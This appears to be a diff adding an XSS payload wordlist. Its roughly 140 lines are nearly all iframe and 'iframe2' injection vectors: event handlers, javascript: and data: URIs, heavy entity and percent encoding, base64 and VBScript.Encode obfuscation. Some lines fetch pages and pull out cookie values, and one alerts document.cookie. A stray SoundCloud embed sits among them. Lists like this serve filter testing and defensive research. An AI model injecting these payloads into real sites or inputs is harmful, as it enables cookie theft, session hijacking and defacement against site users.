@@ -1,0 +1,141 @@
+<iframe src=javascript:alert(1)>
+"><iframe%20src="http://google.com"%%203E
+<iframe src=http://www.google.com/></iframe>
+<iframe src="//evil?
+“><iframe/src=javascript:prompt(1)>
+<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
+<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
+<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
+<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
+<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+<iframe/src \/\/onload = prompt(1)
+<iframe/onreadystatechange=alert(1)
+<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?
+<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
+<iframe  src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
+<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
+<iframe src="javascript:alert(`xss`)">
+<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>
+<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
+“><iframe/src=javascript:co\u006efir\u006d%28 1%29>
+“><iframe srcdoc=”&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;”>
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+<iframe autofocus onfocus=alert(1)>
+<iframe autofocus onfocusin=alert(1)>
+<iframe draggable="true" ondrag="alert(1)">test</iframe>
+<iframe draggable="true" ondragend="alert(1)">test</iframe>
+<iframe draggable="true" ondragenter="alert(1)">test</iframe>
+<iframe draggable="true" ondragleave="alert(1)">test</iframe>
+<iframe draggable="true" ondragstart="alert(1)">test</iframe>
+<iframe id=x onfocus=alert(1)>
+<iframe id=x onfocusin=alert(1)>
+<iframe id=x tabindex=1 onactivate=alert(1)></iframe>
+<iframe id=x tabindex=1 onbeforeactivate=alert(1)></iframe>
+<iframe id=x tabindex=1 onbeforedeactivate=alert(1)></iframe><input autofocus>
+<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>
+<iframe onafterscriptexecute=alert(1)><script>1</script>
+<iframe onbeforecopy="alert(1)" contenteditable>test</iframe>
+<iframe onbeforecut="alert(1)" contenteditable>test</iframe>
+<iframe onbeforepaste="alert(1)" contenteditable>test</iframe>
+<iframe onbeforescriptexecute=alert(1)><script>1</script>
+<iframe onblur=alert(1) id=x><input autofocus>
+<iframe onclick="alert(1)">test</iframe>
+<iframe oncontextmenu="alert(1)">test</iframe>
+<iframe oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<iframe oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<iframe ondblclick="alert(1)" autofocus tabindex=1>test</iframe>
+<iframe onfocusout=alert(1) id=x><input autofocus>
+<iframe onkeydown="alert(1)" contenteditable>test</iframe>
+<iframe onkeypress="alert(1)" contenteditable>test</iframe>
+<iframe onkeyup="alert(1)" contenteditable>test</iframe>
+<iframe onload=alert(1)></iframe>
+<iframe onmousedown="alert(1)">test</iframe>
+<iframe onmouseenter="alert(1)">test</iframe>
+<iframe onmouseleave="alert(1)">test</iframe>
+<iframe onmousemove="alert(1)">test</iframe>
+<iframe onmouseout="alert(1)">test</iframe>
+<iframe onmouseover="alert(1)">test</iframe>
+<iframe onmouseup="alert(1)">test</iframe>
+<iframe onmousewheel=alert(1)>requires scrolling
+<iframe onpaste="alert(1)" contenteditable>test</iframe>
+<iframe onpointerdown=alert(1)>XSS</iframe>
+<iframe onpointerenter=alert(1)>XSS</iframe>
+<iframe onpointerleave=alert(1)>XSS</iframe>
+<iframe onpointermove=alert(1)>XSS</iframe>
+<iframe onpointerout=alert(1)>XSS</iframe>
+<iframe onpointerover=alert(1)>XSS</iframe>
+<iframe onpointerrawupdate=alert(1)>XSS</iframe>
+<iframe onpointerup=alert(1)>XSS</iframe>
+<iframe onreadystatechange=alert(1)></iframe>
+<iframe src="data:text/html,<img src=1 onerror=alert(document.domain)>">
+<iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
+<iframe language=VBScript.Encode onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
+<iframe src="javascript:alert(1)">
+<iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>
+<iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>
+<iframe name="alert(1)" src="https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></iframe>
+<iframe sandbox src="//portswigger-labs.net"></iframe>
+<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>
+<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>
+<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
+<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
+<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
+<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
+<iframe src=%(scriptlet)s <
+<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
+<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
+<iframe src=http://ha.ckers.org/scriptlet.html <
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+<iframe/%00/ src=javaSCRIPT&colon;alert(1)
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
+<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<iframe/onload=alert(/INJECTX/)>
+<iframe2 draggable="true" ondrag="alert(1)">test</iframe2>
+<iframe2 draggable="true" ondragend="alert(1)">test</iframe2>
+<iframe2 draggable="true" ondragenter="alert(1)">test</iframe2>
+<iframe2 draggable="true" ondragleave="alert(1)">test</iframe2>
+<iframe2 draggable="true" ondragstart="alert(1)">test</iframe2>
+<iframe2 id=x tabindex=1 onactivate=alert(1)></iframe2>
+<iframe2 id=x tabindex=1 onbeforeactivate=alert(1)></iframe2>
+<iframe2 id=x tabindex=1 onbeforedeactivate=alert(1)></iframe2><input autofocus>
+<iframe2 id=x tabindex=1 ondeactivate=alert(1)></iframe2><input id=y autofocus>
+<iframe2 onafterscriptexecute=alert(1)><script>1</script>
+<iframe2 onbeforescriptexecute=alert(1)><script>1</script>
+<iframe2 onclick="alert(1)">test</iframe2>
+<iframe2 oncontextmenu="alert(1)">test</iframe2>
+<iframe2 oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<iframe2 oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<iframe2 ondblclick="alert(1)" autofocus tabindex=1>test</iframe2>
+<iframe2 onkeydown="alert(1)" contenteditable>test</iframe2>
+<iframe2 onkeypress="alert(1)" contenteditable>test</iframe2>
+<iframe2 onkeyup="alert(1)" contenteditable>test</iframe2>
+<iframe2 onmousedown="alert(1)">test</iframe2>
+<iframe2 onmouseenter="alert(1)">test</iframe2>
+<iframe2 onmouseleave="alert(1)">test</iframe2>
+<iframe2 onmousemove="alert(1)">test</iframe2>
+<iframe2 onmouseout="alert(1)">test</iframe2>
+<iframe2 onmouseover="alert(1)">test</iframe2>
+<iframe2 onmouseup="alert(1)">test</iframe2>
+<iframe2 onmousewheel=alert(1)>requires scrolling
+<iframe2 onpointerdown=alert(1)>XSS</iframe2>
+<iframe2 onpointerenter=alert(1)>XSS</iframe2>
+<iframe2 onpointerleave=alert(1)>XSS</iframe2>
+<iframe2 onpointermove=alert(1)>XSS</iframe2>
+<iframe2 onpointerout=alert(1)>XSS</iframe2>
+<iframe2 onpointerover=alert(1)>XSS</iframe2>
+<iframe2 onpointerrawupdate=alert(1)>XSS</iframe2>
+<iframe2 onpointerup=alert(1)>XSS</iframe2>
+
